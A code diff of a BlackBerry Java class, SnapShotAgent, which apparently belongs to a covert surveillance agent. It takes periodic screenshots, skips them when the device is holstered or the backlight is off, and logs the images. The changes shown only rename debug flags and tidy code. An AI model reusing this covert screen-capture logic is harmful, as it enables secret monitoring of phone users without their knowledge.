@@ -11,7 +11,6 @@ package blackberry.agent;
 
 import java.io.EOFException;
 
-import net.rim.device.api.system.Application;
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.system.Bitmap;
 import net.rim.device.api.system.DeviceInfo;
@@ -81,19 +80,19 @@ public final class SnapShotAgent extends Agent {
      */
     public void actualRun() {
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("Taking snapshot");
         //#endif
 
         if (DeviceInfo.isInHolster()) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("In Holster, skipping snapshot");
             //#endif
             return;
         }
 
         if (!Backlight.isEnabled()) {
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("No backlight, skipping snapshot");
             //#endif
             return;
@@ -101,7 +100,7 @@ public final class SnapShotAgent extends Agent {
 
         final Bitmap bitmap = getScreenshot();
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("screenshot");
         //#endif
 
@@ -120,7 +119,7 @@ public final class SnapShotAgent extends Agent {
             log.close();
         }
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("finished run");
         //#endif
 
@@ -136,11 +135,9 @@ public final class SnapShotAgent extends Agent {
         final int height = Display.getHeight();
         bitmap = new Bitmap(width, height);
 
-        //#ifdef DEBUG_TRACE
-        
-       
-        debug.trace("portrait: "
-                + Display.getOrientation());
+        //#ifdef DEBUG
+
+        debug.trace("portrait: " + Display.getOrientation());
         debug.trace("w: " + width + " h:" + height);
         debug.trace("horizontal res: " + Display.getHorizontalResolution());
         debug.trace("Rowwise: " + Display.isRowwise());
@@ -175,7 +172,7 @@ public final class SnapShotAgent extends Agent {
                 "Wrong additional data name");
         //#endif
 
-        //#ifdef DEBUG_TRACE
+        //#ifdef DEBUG
         debug.trace("Additional data len: " + additionalData.length);
 
         //#endif
@@ -204,7 +201,7 @@ public final class SnapShotAgent extends Agent {
 
             value = databuffer.readInt();
             onNewWindow = (value == 1);
-            //#ifdef DEBUG_TRACE
+            //#ifdef DEBUG
             debug.trace("onNewWindow: " + onNewWindow);
             //#endif
 
@@ -218,7 +215,7 @@ public final class SnapShotAgent extends Agent {
         setPeriod(timerMillis);
         setDelay(timerMillis);
 
-        //#ifdef DEBUG_INFO
+        //#ifdef DEBUG
         debug.info("timer: " + timerMillis + " ms");
 
         //#endif
